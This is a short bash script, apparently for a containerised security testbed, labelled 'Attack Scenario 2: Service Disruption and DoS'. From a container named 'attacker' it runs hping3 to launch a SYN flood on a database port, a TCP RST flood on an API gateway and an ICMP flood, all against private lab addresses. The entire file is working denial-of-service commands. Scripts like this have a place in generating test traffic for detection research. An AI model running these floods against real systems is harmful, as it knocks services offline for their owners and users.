#!/bin/bash

echo "Starting Attack Scenario 2: Service Disruption and DoS"

# Multiple attack vectors using hping3
docker exec attacker bash -c "
    echo 'Launching SYN Flood attack on database server...' &&
    timeout 60 hping3 -S --flood -V -p 3306 172.18.0.30 &&
    
    echo 'TCP RST attack on API gateway...' &&
    timeout 60 hping3 --tcp-rst -V -p 80 172.18.0.40 &&
    
    echo 'ICMP flood to cloud server...' &&
    timeout 60 hping3 -1 --flood -V 172.18.0.20
"

echo "Attack Scenario 2: Service Disruption Complete"